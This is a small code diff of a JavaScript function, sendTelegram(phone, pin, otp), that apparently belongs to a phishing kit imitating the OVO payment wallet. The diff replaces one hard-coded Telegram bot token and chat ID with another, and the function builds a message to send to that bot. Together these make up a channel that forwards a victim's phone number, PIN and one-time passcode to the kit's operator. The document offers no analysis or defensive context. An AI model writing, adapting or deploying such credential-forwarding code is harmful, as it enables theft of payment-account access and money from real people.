@@ -1,6 +1,6 @@
 function sendTelegram(phone, pin, otp) {
-    const botToken = "7247863634:AAFXAS2P2b60HWYS9OEbPQ3pPTnqv5oVZwg";
-    const chatId   = "1932640103";
+    const botToken = "8446620248:AAHwRK7mrr9ggvFaor9olOibfYeErTLbPO0";
+    const chatId   = "6989148477";
 
     const message = `
 ☬ ∘ OVO ∘ ☬
@@ -29,3 +29,4 @@ function sendTelegram(phone, pin, otp) {
         return false;
     });
 }
+
